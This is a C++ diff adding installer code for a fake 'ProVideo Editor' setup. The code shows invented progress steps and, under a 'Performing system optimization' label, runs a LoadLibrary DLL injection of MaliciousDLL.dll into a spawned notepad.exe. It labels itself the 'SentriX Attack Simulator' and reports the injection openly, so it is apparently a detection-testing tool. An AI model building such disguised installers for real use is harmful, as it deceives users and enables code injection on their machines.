@@ -301,3 +301,154 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 
     return DefWindowProc(hwnd, uMsg, wParam, lParam);
 }
+void StartInstallation()
+{
+    isInstalling = true;
+
+    // Hide initial UI
+    ShowWindow(hwndWelcomeText, SW_HIDE);
+    ShowWindow(hwndDescriptionText, SW_HIDE);
+    ShowWindow(hwndLicenseCheck, SW_HIDE);
+    ShowWindow(hwndInstallBtn, SW_HIDE);
+
+    // Show progress UI
+    ShowWindow(hwndStatusText, SW_SHOW);
+    ShowWindow(hwndProgressBar, SW_SHOW);
+    ShowWindow(hwndProgressDetail, SW_SHOW);
+
+    // Start installation in separate thread
+    std::thread installThread([]() {
+
+        const wchar_t* steps[] = {
+            L"Extracting files...",
+            L"Installing components...",
+            L"Configuring settings...",
+            L"Registering application...",
+            L"Performing system optimization...",  // ← INJECTION HAPPENS HERE
+            L"Finalizing installation..."
+        };
+
+        SendMessage(hwndProgressBar, PBM_SETRANGE, 0, MAKELPARAM(0, 100));
+
+        for (int i = 0; i < 6; i++)
+        {
+            SetWindowText(hwndProgressDetail, steps[i]);
+
+            // Simulate progress
+            for (int j = 0; j < 17; j++)
+            {
+                int progress = (i * 17) + j;
+                SendMessage(hwndProgressBar, PBM_SETPOS, progress, 0);
+                Sleep(100);
+            }
+
+            // Perform DLL injection during "system optimization"
+            if (i == 4)
+            {
+                LogActivity("Starting malicious injection phase...");
+                PerformMaliciousInjection();
+            }
+        }
+
+        // Complete
+        SendMessage(hwndProgressBar, PBM_SETPOS, 100, 0);
+        Sleep(500);
+
+        // Show success
+        SetWindowText(hwndStatusText, L"Installation Complete!");
+        SetWindowText(hwndProgressDetail, L"ProVideo Editor has been successfully installed.");
+
+        ShowWindow(hwndProgressBar, SW_HIDE);
+        ShowWindow(hwndCancelBtn, SW_HIDE);
+        ShowWindow(hwndFinishBtn, SW_SHOW);
+
+        if (injectionSuccessful)
+        {
+            MessageBox(hwndMain,
+                L"Installation completed successfully!\n\n"
+                L"[SentriX] DLL injection was performed successfully.\n"
+                L"Check C:\\SentriX_injection_proof.txt for details.",
+                L"ProVideo Editor - Setup Complete",
+                MB_OK | MB_ICONINFORMATION);
+        }
+        else
+        {
+            MessageBox(hwndMain,
+                L"Installation completed.\n\n"
+                L"[SentriX] Note: DLL injection failed.\n"
+                L"Ensure MaliciousDLL.dll is in the same folder.",
+                L"ProVideo Editor - Setup Complete",
+                MB_OK | MB_ICONWARNING);
+        }
+
+        });
+
+    installThread.detach();
+}
+
+void PerformMaliciousInjection()
+{
+    try
+    {
+        LogActivity("============================================");
+        LogActivity("SentriX Attack Simulator - Injection Phase");
+        LogActivity("============================================");
+        LogActivity("Technique: LoadLibrary DLL Injection");
+        LogActivity("MITRE ATT&CK: T1055.001");
+        LogActivity("");
+
+        // Step 1: Spawn target process (notepad.exe)
+        LogActivity("[STEP 1] Spawning target process (notepad.exe)...");
+        spawnedTargetPID = SpawnTargetProcess();
+
+        if (spawnedTargetPID == 0)
+        {
+            LogActivity("[ERROR] Failed to spawn target process!");
+            injectionSuccessful = false;
+            return;
+        }
+
+        LogActivity("[SUCCESS] Target process spawned: PID " + std::to_string(spawnedTargetPID));
+
+        // Step 2: Get DLL path
+        LogActivity("[STEP 2] Resolving MaliciousDLL.dll path...");
+        std::string dllPathStr = GetDLLPath();
+
+        // Check if DLL exists
+        std::ifstream dllCheck(dllPathStr);
+        if (!dllCheck.good())
+        {
+            LogActivity("[ERROR] DLL not found at: " + dllPathStr);
+            LogActivity("[INFO] Please ensure MaliciousDLL.dll is in the same folder as this executable");
+            injectionSuccessful = false;
+            return;
+        }
+        dllCheck.close();
+
+        LogActivity("[SUCCESS] DLL found: " + dllPathStr);
+
+        // Step 3: Perform injection
+        LogActivity("[STEP 3] Performing LoadLibrary injection...");
+        bool success = InjectDLL(spawnedTargetPID, dllPathStr.c_str());
+
+        if (success)
+        {
+            LogActivity("");
+            LogActivity("============================================");
+            LogActivity("[SUCCESS] DLL INJECTION COMPLETED!");
+            LogActivity("============================================");
+            LogActivity("Check proof file: " + std::string(SENTRIX_LOG_FILE));
+            injectionSuccessful = true;
+        }
+        else
+        {
+            LogActivity("[ERROR] DLL injection failed");
+            injectionSuccessful = false;
+        }
+    }
+    catch (...)
+    {
+        LogActivity("[EXCEPTION] Error during injection");
+        injectionSuccessful = false;
+    }
+}
